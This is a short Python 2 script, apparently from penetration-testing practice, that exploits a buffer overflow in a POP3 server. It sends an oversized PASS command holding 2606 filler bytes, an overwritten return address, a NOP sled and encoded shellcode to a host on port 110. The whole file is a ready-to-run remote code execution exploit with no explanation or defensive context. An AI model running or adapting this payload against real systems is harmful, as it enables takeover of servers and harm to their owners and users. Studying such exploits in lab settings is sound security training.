#!/usr/bin/python

import socket

shellcode = ("\xdb\xd0\xb8\x8f\x56\x33\xbf\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\x4c\x52\xd1\x4a\xae\xb3\x97"
"\xb5\x4e\x44\xf8\x3c\xab\x75\x38\x5a\xb8\x26\x88\x28\xec\xca"
"\x63\x7c\x04\x58\x01\xa9\x2b\xe9\xac\x8f\x02\xea\x9d\xec\x05"
"\x68\xdc\x20\xe5\x51\x2f\x35\xe4\x96\x52\xb4\xb4\x4f\x18\x6b"
"\x28\xfb\x54\xb0\xc3\xb7\x79\xb0\x30\x0f\x7b\x91\xe7\x1b\x22"
"\x31\x06\xcf\x5e\x78\x10\x0c\x5a\x32\xab\xe6\x10\xc5\x7d\x37"
"\xd8\x6a\x40\xf7\x2b\x72\x85\x30\xd4\x01\xff\x42\x69\x12\xc4"
"\x39\xb5\x97\xde\x9a\x3e\x0f\x3a\x1a\x92\xd6\xc9\x10\x5f\x9c"
"\x95\x34\x5e\x71\xae\x41\xeb\x74\x60\xc0\xaf\x52\xa4\x88\x74"
"\xfa\xfd\x74\xda\x03\x1d\xd7\x83\xa1\x56\xfa\xd0\xdb\x35\x93"
"\x15\xd6\xc5\x63\x32\x61\xb6\x51\x9d\xd9\x50\xda\x56\xc4\xa7"
"\x1d\x4d\xb0\x37\xe0\x6e\xc1\x1e\x27\x3a\x91\x08\x8e\x43\x7a"
"\xc8\x2f\x96\x2d\x98\x9f\x49\x8e\x48\x60\x3a\x66\x82\x6f\x65"
"\x96\xad\xa5\x0e\x3d\x54\x2e\x9d\xdd\x52\x25\xb5\xe3\x5a\x29"
"\x54\x6d\xbc\x23\x48\x3b\x17\xdc\xf1\x66\xe3\x7d\xfd\xbc\x8e"
"\xbe\x75\x33\x6f\x70\x7e\x3e\x63\xe5\x8e\x75\xd9\xa0\x91\xa3"
"\x75\x2e\x03\x28\x85\x39\x38\xe7\xd2\x6e\x8e\xfe\xb6\x82\xa9"
"\xa8\xa4\x5e\x2f\x92\x6c\x85\x8c\x1d\x6d\x48\xa8\x39\x7d\x94"
"\x31\x06\x29\x48\x64\xd0\x87\x2e\xde\x92\x71\xf9\x8d\x7c\x15"
"\x7c\xfe\xbe\x63\x81\x2b\x49\x8b\x30\x82\x0c\xb4\xfd\x42\x99"
"\xcd\xe3\xf2\x66\x04\xa0\x13\x85\x8c\xdd\xbb\x10\x45\x5c\xa6"
"\xa2\xb0\xa3\xdf\x20\x30\x5c\x24\x38\x31\x59\x60\xfe\xaa\x13"
"\xf9\x6b\xcc\x80\xfa\xb9")

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "\nSending evil buffer..."
	s.connect(('172.31.2.202', 110))
	data = s.recv(1024)
	s.send('USER test' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone!"
except:
	print "Could not connect to POP3 Server!"
